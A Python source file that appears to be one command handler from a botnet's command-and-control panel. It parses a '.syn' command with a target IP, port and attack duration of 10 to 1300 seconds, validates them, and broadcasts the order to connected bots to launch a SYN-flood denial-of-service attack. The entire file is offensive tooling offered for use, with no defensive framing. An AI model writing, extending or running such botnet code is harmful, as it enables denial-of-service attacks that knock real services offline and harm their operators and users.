from colorama import Fore

def syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port, True):
                if validate_time(secs):
                    send(client, ansi_clear, False)
                    attack_sent1(ip, port, secs, client)
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .syn [IP] [PORT] [TIME]')
        send(client, 'Use port 0 for random port mode')